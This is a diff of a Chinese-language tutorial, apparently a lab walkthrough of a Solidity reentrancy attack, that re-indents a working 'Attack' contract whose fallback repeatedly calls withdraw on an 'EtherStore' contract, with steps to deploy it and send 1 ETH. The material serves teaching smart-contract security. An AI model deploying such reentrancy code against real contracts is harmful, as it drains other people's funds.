@@ -46,32 +46,31 @@
 
 4.部署攻击合约<code>Attack</code>，地址填入<code>EtherStore</code>合约地址
 
-        contract Attack {
-            EtherStore public etherStore;
+    contract Attack {
+        EtherStore public etherStore;
 
-            constructor(address _etherStoreAddress) {
-                etherStore = EtherStore(_etherStoreAddress);
-            }
+        constructor(address _etherStoreAddress) {
+            etherStore = EtherStore(_etherStoreAddress);
+        }
 
-            // Fallback is called when EtherStore sends Ether to this contract.
-            fallback() external payable {
-                if (address(etherStore).balance >= 1 ether) {
-                    etherStore.withdraw();
-                }
-            }
-
-            function attack() external payable {
-                require(msg.value >= 1 ether);
-                etherStore.deposit{value: 1 ether}();
+        // Fallback is called when EtherStore sends Ether to this contract.
+        fallback() external payable {
+            if (address(etherStore).balance >= 1 ether) {
                 etherStore.withdraw();
             }
-
-
-            // Helper function to check the balance of this contract
-            function getBalance() public view returns (uint) {
-                return address(this).balance;
-            }
         }
+
+        function attack() external payable {
+            require(msg.value >= 1 ether);
+            etherStore.deposit{value: 1 ether}();
+            etherStore.withdraw();
+        }
+
+        // Helper function to check the balance of this contract
+        function getBalance() public view returns (uint) {
+            return address(this).balance;
+        }
+    }
 5.使用<code>Attack</code>方法，向<code>EtherStore</code>合约转账1个ETH  
 
 ![image](https://user-images.githubusercontent.com/35074461/197674208-c5e45461-c663-4650-8853-58f31a713541.png)  
@@ -82,3 +81,4 @@
 
 漏洞分析
 --
+
